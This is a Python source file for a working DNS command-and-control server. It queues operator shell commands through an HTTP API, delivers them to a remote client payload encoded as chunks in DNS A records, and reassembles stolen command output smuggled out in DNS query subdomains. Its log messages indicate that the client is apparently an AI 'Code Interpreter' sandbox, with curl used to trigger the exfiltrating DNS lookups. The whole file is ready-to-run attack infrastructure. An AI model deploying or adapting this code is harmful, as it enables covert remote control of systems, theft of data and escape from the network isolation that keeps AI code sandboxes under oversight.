"""
DNS C2 Server with HTTP API for remote operator access.

This server:
- Listens for DNS queries from the client payload (port 53)
- Provides HTTP API for operator commands (port 8080)
- Serves commands via TXT records
- Receives exfiltrated data via DNS query subdomains
- Maintains a command queue for the operator interface
"""

import socket
import base64
import threading
import queue
import time
import logging
import sys
import os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, TXT, A
from dnslib.server import DNSServer, BaseResolver

# Configure logging to both file and console
log_dir = '/var/log/dns-c2'
log_file = os.path.join(log_dir, 'dns_server.log')

# Create log directory if it doesn't exist (skip if no permissions, e.g., during testing)
try:
    os.makedirs(log_dir, exist_ok=True)
except PermissionError:
    # Fall back to current directory for testing
    log_dir = '.'
    log_file = 'dns_server.log'

# Configure logging with immediate flush
file_handler = logging.FileHandler(log_file)
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

console_handler = logging.StreamHandler(sys.stdout)
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)

logger = logging.getLogger(__name__)

# Force unbuffered output
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', buffering=1)
sys.stderr = os.fdopen(sys.stderr.fileno(), 'w', buffering=1)

# Log startup
logger.info("=" * 60)
logger.info("DNS C2 Server Starting...")
logger.info(f"Log file: {log_file}")
logger.info(f"DNS Port: 53")
logger.info(f"API Port: 8080")
logger.info("=" * 60)


# ============================================================================
# DNS Protocol Helper Functions (for testing)
# ============================================================================

def encode_chunk_to_ip(chunk_data: str, is_last: bool) -> str:
    """
    Encode a chunk of base64 data into an IP address.
    
    Protocol:
    - First octet: 10 (more chunks) or 11 (last chunk)
    - Octets 2-4: ASCII values of up to 3 characters
    - Pad with 0 if less than 3 characters
    
    Args:
        chunk_data: Up to 3 characters of base64 data
        is_last: True if this is the last chunk
        
    Returns:
        IP address string (e.g., "10.100.50.104")
        
    Example:
        >>> encode_chunk_to_ip("d2h", False)
        '10.100.50.104'
        >>> encode_chunk_to_ip("1p", True)
        '11.49.112.0'
    """
    first_octet = "11" if is_last else "10"
    octets = [first_octet]
    for char in chunk_data:
        octets.append(str(ord(char)))
    while len(octets) < 4:
        octets.append("0")
    return ".".join(octets)


def encode_command_to_chunks(command: str) -> list:
    """
    Encode a complete command into IP address chunks.
    
    Args:
        command: Shell command to encode
        
    Returns:
        List of (chunk_num, ip_address, is_last) tuples
        
    Example:
        >>> chunks = encode_command_to_chunks("whoami")
        >>> len(chunks)
        3
        >>> chunks[0]
        (0, '10.100.50.104', False)
        >>> chunks[2]
        (2, '11.49.112.0', True)
    """
    # Step 1: Encode to base64
    encoded_cmd = base64.b64encode(command.encode()).decode()
    
    # Step 2: Split into chunks and encode each
    chunks = []
    chunk_num = 0
    
    while chunk_num * 3 < len(encoded_cmd):
        start_idx = chunk_num * 3
        chunk_data = encoded_cmd[start_idx:start_idx + 3]
        
        if chunk_data:
            # Check if last chunk
            is_last = (start_idx + 3 >= len(encoded_cmd))
            
            # Encode chunk to IP
            ip_address = encode_chunk_to_ip(chunk_data, is_last)
            chunks.append((chunk_num, ip_address, is_last))
        
        chunk_num += 1
    
    return chunks


def calculate_chunk_count(command: str) -> int:
    """
    Calculate how many chunks a command will need.
    
    Args:
        command: Shell command
        
    Returns:
        Number of chunks needed
        
    Example:
        >>> calculate_chunk_count("whoami")
        3
        >>> calculate_chunk_count("ls")
        2
    """
    encoded_cmd = base64.b64encode(command.encode()).decode()
    return (len(encoded_cmd) + 2) // 3  # Ceiling division


# ============================================================================
# DNS C2 Resolver
# ============================================================================

class C2Resolver(BaseResolver):
    """Custom DNS resolver for C2 communication."""
    
    def __init__(self, domain, output_log):
        self.domain = domain.rstrip('.')
        self.command_queue = queue.Queue()  # Global queue for backward compat
        self.client_commands = {}  # {client_id: queue.Queue()}
        self.output_buffer = {}  # client_id -> list of output chunks
        self.output_log = output_log  # Shared output log
        self.pending_commands = {}  # {client_id: encoded_command}
        self.terminated_sessions = set()  # Set of session IDs that should stop polling
        self.lock = threading.Lock()
        
    def resolve(self, request, handler):
        """Handle DNS queries."""
        reply = request.reply()
        qname = str(request.q.qname).rstrip('.')
        qtype = QTYPE[request.q.qtype]
        
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        # Skip logging for AAAA queries and repetitive polls
        # We'll log meaningful events in the handlers instead
        
        # Check if this is a command poll request: cmd.<cmd_seq>.<client_id>.<domain>
        if qname.startswith('cmd.') and qname.endswith(self.domain):
            parts = qname.split('.')
            if len(parts) >= 4:
                cmd_seq = parts[1]  # Command sequence number (ignored, just for cache busting)
                client_id = parts[2]
                
                # Check if this session has been terminated
                if client_id in self.terminated_sessions:
                    # Only log first time we send exit signal to reduce noise
                    if not hasattr(self, '_exit_notified'):
                        self._exit_notified = set()
                    if client_id not in self._exit_notified:
                        logger.info(f"🛑 [TERMINATED] Session {client_id} → Sending exit signal")
                        self._exit_notified.add(client_id)
                    # Send special IP to signal termination: 192.168.0.1
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A("192.168.0.1"), ttl=0))
                    return reply
                
                # Check if we already have a pending command for this client
                if client_id in self.pending_commands:
                    # Command is already staged and waiting to be fetched
                    # Silent - command ready
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A("10.0.0.1"), ttl=0))
                else:
                    # Try to get a new command
                    command = self._get_next_command(client_id)
                    
                    if command:
                        # Clear any old pending command first (from previous command that was fully delivered)
                        with self.lock:
                            if client_id in self.pending_commands:
                                del self.pending_commands[client_id]
                            if hasattr(self, '_completed_commands') and client_id in self._completed_commands:
                                self._completed_commands.remove(client_id)
                            
                            # Clear logged output flag so client can exfiltrate new output
                            if hasattr(self, '_logged_outputs') and client_id in self._logged_outputs:
                                del self._logged_outputs[client_id]
                            
                            # Store new command for this client (for chunk retrieval)
                            # Encode command in base64
                            encoded_cmd = base64.b64encode(command.encode()).decode()
                            self.pending_commands[client_id] = encoded_cmd
                        
                        logger.info(f"📥 [COMMAND READY] Session {client_id} → '{command}' staged in DNS")
                        logger.info(f"   ℹ️  Waiting for Code Interpreter to query: cmd.{client_id}.{self.domain}")
                        # Initialize notification tracker
                        if not hasattr(self, '_notified_clients'):
                            self._notified_clients = set()
                        # Signal command available with 10.0.0.1
                        reply.add_answer(RR(qname, QTYPE.A, rdata=A("10.0.0.1"), ttl=0))
                    else:
                        # No command available, send IDLE (127.0.0.1)
                        # Only log polls periodically to reduce noise
                        if not hasattr(self, '_poll_counts'):
                            self._poll_counts = {}
                        if client_id not in self._poll_counts:
                            self._poll_counts[client_id] = 0
                            logger.info(f"👋 [FIRST POLL] {client_id} → First DNS query received from this session")
                            logger.info(f"   ℹ️  Session initialized, waiting for commands...")
                        self._poll_counts[client_id] += 1
                        
                        # Track last poll time for session detection
                        if not hasattr(self, '_last_poll_time'):
                            self._last_poll_time = {}
                        self._last_poll_time[client_id] = time.time()
                        # Log every 10th poll to show it's still active
                        if self._poll_counts[client_id] % 10 == 0:
                            logger.info(f"💤 [IDLE] Session {client_id} → Still polling (#{self._poll_counts[client_id]})")
                        reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
        
        # Check if this is an exfiltration status check: status.<client_id>.<domain>
        elif qname.startswith('status.') and qname.endswith(self.domain):
            parts = qname.split('.')
            if len(parts) >= 3:
                client_id = parts[1]
                
                # Check if we already have output for this session
                if not hasattr(self, '_logged_outputs'):
                    self._logged_outputs = {}
                
                if client_id in self._logged_outputs:
                    # Already have output, tell client to skip exfiltration
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.2"), ttl=0))
                    logger.debug(f"[STATUS CHECK] Session {client_id} → Output already received (0.0.0.2)")
                else:
                    # No output yet, tell client to proceed
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.1"), ttl=0))
                    logger.debug(f"[STATUS CHECK] Session {client_id} → Ready to receive (0.0.0.1)")
        
        # Check if this is a command chunk request: c<N>.<client_id>.<domain>
        elif qname.startswith('c') and qname.endswith(self.domain):
            parts = qname.split('.')
            if len(parts) >= 3 and parts[0][0] == 'c':
                try:
                    chunk_num = int(parts[0][1:])  # Extract number from c0, c1, etc.
                    client_id = parts[1]
                    
                    # Get the pending command for this client
                    with self.lock:
                        encoded_cmd = self.pending_commands.get(client_id, "")
                    
                    if encoded_cmd:
                        # Calculate chunk data (3 bytes per chunk)
                        start_idx = chunk_num * 3
                        chunk_data = encoded_cmd[start_idx:start_idx + 3]
                        
                        if chunk_data:
                            # Encode chunk in IP address using helper function
                            is_last = (start_idx + 3 >= len(encoded_cmd))
                            ip_address = encode_chunk_to_ip(chunk_data, is_last)
                            
                            # Decode what we're sending for logging
                            chunk_decoded = chunk_data  # Already have the decoded chunk data
                            
                            # Track which chunks we've already logged to avoid duplicates
                            if not hasattr(self, '_logged_chunks'):
                                self._logged_chunks = {}
                            
                            chunk_key = f"{client_id}:{chunk_num}"
                            
                            if chunk_key not in self._logged_chunks:
                                self._logged_chunks[chunk_key] = True
                                
                                if chunk_num == 0:
                                    logger.info(f"📤 [COMMAND DELIVERY START] Session {client_id}")
                                    logger.info(f"   ℹ️  Command: '{base64.b64decode(encoded_cmd).decode()}'")
                                    logger.info(f"   ℹ️  Client will fetch chunks sequentially (c0, c1, c2...)")
                                
                                # Show the chunk being served
                                dns_query = f"c{chunk_num}.{client_id}.{self.domain}"
                                chunk_status = "→ more chunks" if not is_last else "→ FINAL"
                                logger.info(f"   └─ Chunk {chunk_num}: {dns_query}")
                                logger.info(f"      └─ {ip_address} = '{chunk_decoded}' {chunk_status}")
                            # Clear notification flag when chunks start
                            if hasattr(self, '_notified_clients') and client_id in self._notified_clients:
                                self._notified_clients.remove(client_id)
                            
                            reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip_address), ttl=0))
                            
                            # If this was the last chunk, log completion but DON'T delete yet
                            # (keep it around for DNS retries)
                            if is_last:
                                # Only log once
                                if not hasattr(self, '_completed_commands'):
                                    self._completed_commands = set()
                                
                                if client_id not in self._completed_commands:
                                    self._completed_commands.add(client_id)
                                    with self.lock:
                                        full_cmd = base64.b64decode(self.pending_commands[client_id]).decode()
                                        logger.info(f"✅ [ALL CHUNKS SERVED] Session {client_id}")
                                        logger.info(f"   ℹ️  Client should have: '{full_cmd}'")
                                        logger.info(f"   ⏳ Waiting for execution and output...")
                                    
                                    # Clean up logged chunks for this client
                                    if hasattr(self, '_logged_chunks'):
                                        keys_to_remove = [k for k in self._logged_chunks.keys() if k.startswith(f"{client_id}:")]
                                        for key in keys_to_remove:
                                            del self._logged_chunks[key]
                                    # Reset poll counter after command delivery
                                    if hasattr(self, '_poll_counts') and client_id in self._poll_counts:
                                        self._poll_counts[client_id] = 0
                                
                                # Delete pending command after a delay (allow for retries)
                                # We'll delete it when the client polls for a new command
                                # This is handled in the poll logic above
                        else:
                            # No more data
                            reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.0"), ttl=0))
                    else:
                        # No command for this client
                        reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.0"), ttl=0))
                except (ValueError, IndexError) as e:
                    logger.error(f"Error parsing chunk request: {e}")
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.0"), ttl=0))
                    
        # Check if this is data exfiltration: <seq>.<chunk_num>.<total_chunks>.<base64data>.<client_id>.<domain>
        elif qname.endswith(self.domain):
            parts = qname.replace(f'.{self.domain}', '').split('.')
            
            if len(parts) >= 4:
                # Format: seq.chunk.total.timestamp.base64data.cmd_seq.session_id.domain
                # cmd_seq appears twice: once at start, once between data and session_id (for cache busting)
                try:
                    if len(parts) >= 6:
                        cmd_seq = int(parts[0])  # Command sequence number
                        chunk_num = int(parts[1])
                        total_chunks = int(parts[2])
                        timestamp = parts[3]  # Timestamp for cache busting (ignored)
                        # Second-to-last part is cmd_seq again (for cache busting), last part is client_id
                        client_id = parts[-1]
                        cmd_seq_repeat = parts[-2]  # cmd_seq repeated for cache busting (ignored)
                        # Everything between timestamp and cmd_seq_repeat is base64 data
                        encoded_data = '.'.join(parts[4:-2]) if len(parts) > 6 else parts[4]
                        
                        # Decode the data
                        try:
                            # Reverse the DNS-safe encoding: convert '-' back to '='
                            encoded_data = encoded_data.replace('-', '=')
                            
                            # Handle empty output sentinel value
                            if encoded_data == 'ZZEmpty':
                                decoded_data = ''
                            else:
                                decoded_data = base64.b64decode(encoded_data).decode('utf-8', errors='replace')
                            
                            if chunk_num == 1 and client_id not in self.output_buffer:
                                logger.info(f"📥 [EXFIL START] Session {client_id} → Code Interpreter exfiltrating output")
                                logger.info(f"   ℹ️  Using curl to trigger DNS queries with embedded data")
                            # Only log chunk details for debugging if needed
                            # logger.debug(f"   └─ Chunk {chunk_num}/{total_chunks}: '{decoded_data[:30]}...'")
                            
                            with self.lock:
                                if client_id not in self.output_buffer:
                                    self.output_buffer[client_id] = {}
                                    logger.info(f"[EXFIL START] Session {client_id} → Starting to receive {total_chunks} chunks")
                                self.output_buffer[client_id][chunk_num] = decoded_data
                                logger.debug(f"[EXFIL CHUNK] Session {client_id} → Received chunk {chunk_num}/{total_chunks}")
                                
                                # Check if we have all chunks
                                if len(self.output_buffer[client_id]) == total_chunks:
                                    # Reconstruct the full output
                                    full_output = ''.join([
                                        self.output_buffer[client_id][i] 
                                        for i in sorted(self.output_buffer[client_id].keys())
                                    ])
                                    
                                    # Track outputs we've already logged to prevent duplicates
                                    # (curl makes multiple DNS queries per hostname - A, AAAA, etc.)
                                    if not hasattr(self, '_logged_outputs'):
                                        self._logged_outputs = {}
                                    
                                    output_hash = hash(full_output)
                                    if client_id not in self._logged_outputs or self._logged_outputs[client_id] != output_hash:
                                        # This is a new/different output, log it
                                        logger.info(f"📤 [OUTPUT RECEIVED] Session {client_id} → Command executed, output exfiltrated:")
                                        # Format output with proper indentation
                                        for line in full_output.strip().split('\n'):
                                            logger.info(f"   │ {line}")
                                        logger.info(f"   └─ Complete ({len(full_output)} bytes via {total_chunks} DNS queries)")
                                        logger.info(f"   ⏳ Waiting for next command or session to end...")
                                        
                                        # Add to output log for remote operator
                                        self.output_log.append({
                                            'id': len(self.output_log) + 1,
                                            'timestamp': timestamp,
                                            'client_id': client_id,
                                            'data': full_output
                                        })
                                        
                                        # Remember this output to prevent duplicates
                                        self._logged_outputs[client_id] = output_hash
                                    else:
                                        # Duplicate output from DNS retries, skip logging
                                        logger.debug(f"[EXFIL DUPLICATE] Session {client_id} → Skipping duplicate output")
                                    
                                    # Clear pending command now that output is received
                                    # This must happen ALWAYS, even for duplicate outputs (e.g., identical error messages)
                                    # Otherwise the client gets stuck in an infinite loop receiving the same command
                                    if client_id in self.pending_commands:
                                        del self.pending_commands[client_id]
                                        logger.info(f"✅ [COMMAND COMPLETE] Session {client_id} → Cleared pending command, ready for next")
                                    
                                    # Clear buffer
                                    del self.output_buffer[client_id]
                                    
                        except Exception as e:
                            logger.error(f"Error decoding data: {e}")
                            
                except (ValueError, IndexError) as e:
                    logger.error(f"Error parsing exfiltration query: {e}")
                    
            # Always respond with a dummy A record to keep the connection happy
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
        
        return reply
    
    def _get_next_command(self, client_id=None):
        """Get the next command from the queue (non-blocking)."""
        # First check client-specific queue
        if client_id and client_id in self.client_commands:
            try:
                return self.client_commands[client_id].get_nowait()
            except queue.Empty:
                pass
        
        # Fall back to global queue for backward compatibility
        try:
            return self.command_queue.get_nowait()
        except queue.Empty:
            return None
    
    def queue_command(self, command, client_id=None):
        """Add a command to the queue."""
        if client_id:
            # Create client queue if doesn't exist
            if client_id not in self.client_commands:
                self.client_commands[client_id] = queue.Queue()
            self.client_commands[client_id].put(command)
            # This is redundant with OPERATOR log, skip it
        else:
            # Global queue for backward compatibility
            self.command_queue.put(command)
            logger.info(f"[QUEUE] Global → Command added: '{command}'")
    
    def terminate_session(self, client_id):
        """Mark a session as terminated."""
        with self.lock:
            self.terminated_sessions.add(client_id)
            # Clean up session data
            if client_id in self.client_commands:
                del self.client_commands[client_id]
            if client_id in self.pending_commands:
                del self.pending_commands[client_id]
            if client_id in self.output_buffer:
                del self.output_buffer[client_id]
        logger.info(f"🗑️  [SESSION TERMINATED] {client_id} → Session marked for termination")


class APIHandler(BaseHTTPRequestHandler):
    """HTTP API handler for remote operator access."""
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass
    
    def do_GET(self):
        """Handle GET requests."""
        if self.path.startswith('/api/output'):
            # Return output log
            since_id = 0
            session_id = None
            if '?' in self.path:
                params = dict(x.split('=') for x in self.path.split('?')[1].split('&') if '=' in x)
                since_id = int(params.get('since', 0))
                session_id = params.get('session')
            
            # Filter by session if specified
            if session_id:
                outputs = [o for o in self.server.output_log 
                          if o['id'] > since_id and o.get('client_id') == session_id]
            else:
                outputs = [o for o in self.server.output_log if o['id'] > since_id]
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'outputs': outputs}).encode())
        elif self.path.startswith('/api/sessions'):
            # Return sessions that have polled recently
            active_sessions = []
            
            # Get sessions that have polled in the last 60 seconds
            if hasattr(self.server.resolver, '_last_poll_time'):
                current_time = time.time()
                for session_id, last_time in self.server.resolver._last_poll_time.items():
                    if current_time - last_time < 60:  # Active within last minute
                        active_sessions.append(session_id)
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'sessions': active_sessions}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests."""
        if self.path == '/api/command':
            # Queue a command
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            data = json.loads(body.decode())
            
            command = data.get('command', '')
            session_id = data.get('session')  # Optional session ID
            
            if command:
                # Clear old pending command, output flag, and command queue for this session
                # This allows the new command to be fetched on next poll
                if session_id:
                    with self.server.resolver.lock:
                        if session_id in self.server.resolver.pending_commands:
                            logger.info(f"[HTTP API] Clearing old pending command for {session_id}")
                            del self.server.resolver.pending_commands[session_id]
                        if hasattr(self.server.resolver, '_logged_outputs') and session_id in self.server.resolver._logged_outputs:
                            logger.info(f"[HTTP API] Clearing logged output for {session_id}")
                            del self.server.resolver._logged_outputs[session_id]
                        if hasattr(self.server.resolver, '_notified_clients') and session_id in self.server.resolver._notified_clients:
                            logger.info(f"[HTTP API] Clearing notified client flag for {session_id}")
                            self.server.resolver._notified_clients.remove(session_id)
                        # Clear any old commands in the queue
                        if session_id in self.server.resolver.client_commands:
                            # Empty the queue
                            cleared_count = 0
                            while not self.server.resolver.client_commands[session_id].empty():
                                try:
                                    self.server.resolver.client_commands[session_id].get_nowait()
                                    cleared_count += 1
                                except:
                                    break
                            if cleared_count > 0:
                                logger.debug(f"[HTTP API] Cleared {cleared_count} old commands from queue for {session_id}")
                
                self.server.resolver.queue_command(command, client_id=session_id)
                timestamp = datetime.now().strftime('%H:%M:%S')
                if session_id:
                    logger.info(f"🎮 [OPERATOR] HTTP POST /api/command → Session {session_id}: '{command}'")
                else:
                    logger.info(f"🎮 [OPERATOR] HTTP POST /api/command → Global: '{command}'")
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'ok'}).encode())
            else:
                self.send_response(400)
                self.end_headers()
        elif self.path == '/api/terminate':
            # Terminate a session
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            data = json.loads(body.decode())
            
            session_id = data.get('session')
            
            if session_id:
                self.server.resolver.terminate_session(session_id)
                logger.info(f"🎮 [OPERATOR] HTTP POST /api/terminate → Session {session_id}")
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'ok', 'message': f'Session {session_id} terminated'}).encode())
            else:
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'error', 'message': 'session parameter required'}).encode())
        else:
            self.send_response(404)
            self.end_headers()


class DNSServerWithAPI:
    """Manages both DNS server and HTTP API."""
    
    def __init__(self, domain, dns_port=53, api_port=8080, address='0.0.0.0'):
        self.domain = domain
        self.dns_port = dns_port
        self.api_port = api_port
        self.address = address
        self.output_log = []  # Shared output log
        self.resolver = C2Resolver(domain, self.output_log)
        self.dns_server = None
        self.api_server = None
        self.dns_thread = None
        self.api_thread = None
        
    def start(self):
        """Start both DNS and API servers."""
        # Start DNS server
        self.dns_server = DNSServer(self.resolver, port=self.dns_port, address=self.address)
        self.dns_thread = threading.Thread(target=self.dns_server.start, daemon=True)
        self.dns_thread.start()
        logger.info(f"DNS C&C Server started on {self.address}:{self.dns_port}")
        logger.info(f"Domain: {self.domain}")
        
        # Start HTTP API server
        self.api_server = HTTPServer((self.address, self.api_port), APIHandler)
        self.api_server.resolver = self.resolver
        self.api_server.output_log = self.output_log
        self.api_thread = threading.Thread(target=self.api_server.serve_forever, daemon=True)
        self.api_thread.start()
        logger.info(f"HTTP API started on {self.address}:{self.api_port}")
        logger.info(f"Remote operator can connect to: http://<server-ip>:{self.api_port}")
        logger.info("Waiting for connections...")
        
    def stop(self):
        """Stop both servers."""
        if self.dns_server:
            self.dns_server.stop()
        if self.api_server:
            self.api_server.shutdown()


def main():
    """Run the DNS server with API."""
    import argparse
    
    parser = argparse.ArgumentParser(description='DNS C&C Server with HTTP API')
    parser.add_argument('--domain', default='c2.bt-research-control.com', 
                        help='Domain for DNS queries')
    parser.add_argument('--dns-port', type=int, default=53, 
                        help='DNS port (default: 53, requires sudo)')
    parser.add_argument('--api-port', type=int, default=8080,
                        help='HTTP API port (default: 8080)')
    parser.add_argument('--address', default='0.0.0.0',
                        help='Address to bind to (default: 0.0.0.0)')
    args = parser.parse_args()
    
    server = DNSServerWithAPI(args.domain, args.dns_port, args.api_port, args.address)
    server.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        server.stop()


if __name__ == '__main__':
    main()


